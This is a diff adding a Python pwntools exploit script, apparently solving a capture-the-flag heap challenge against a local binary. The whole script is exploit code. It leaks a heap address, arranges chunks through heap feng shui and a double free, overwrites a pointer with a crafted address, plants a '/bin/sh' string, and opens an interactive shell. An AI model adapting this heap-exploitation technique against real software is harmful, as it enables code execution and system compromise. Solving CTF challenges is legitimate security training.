@@ -1,0 +1,61 @@
+from pwn import *
+context.log_level='debug'
+context.arch='amd64'
+p=process("./pwn")
+sla 	= p.sendlineafter
+sa 		= p.sendafter
+ra 		= p.readuntil
+def cmd(c):
+    sla("> ",str(c))
+def add(size,c="A",t=1):
+	cmd(1)
+	sla("?\n",str(t))
+	sla("?\n",str(size))
+	sa("?\n",c)
+def edit(size,c):
+	cmd(2)
+	sla("?\n",str(size))
+	sa("?\n",c)
+def show(idx):
+    
+	cmd(3)
+	sla("?\n",str(idx))
+def free(idx):
+	cmd(4)
+	sla("?\n",str(idx))
+# -1 leak
+add(0x18)#0
+add(0x18)#1
+free(1)
+free(0)
+add(0)#2
+show(2)
+heap = u64(p.readline()[:-1]+'\0'*5)
+log.warning(hex(heap))
+
+# overlap
+add(0x18)#3
+add(0x18)#4
+add(0x18)#5
+
+# fengshui
+add(0x88,'\0'*0x70+flat([0,0x81]))#6
+add(0x18,'/bin/sh\0')#victim
+free(2)
+free(3)
+add(0x78)#8
+add(0x78)#9
+free(8)
+free(9)
+free(8)
+# fengshui 
+free(4)
+free(5)
+# heap overflow
+add(0x78,p64(heap+0x6031a0-0x603040))
+add(0x78)
+add(0x78)
+add(0x78,flat([0,0x132,0x4006e0]))
+#gdb.attach(p,'b *0x400a1d')
+show(7)
+p.interactive()
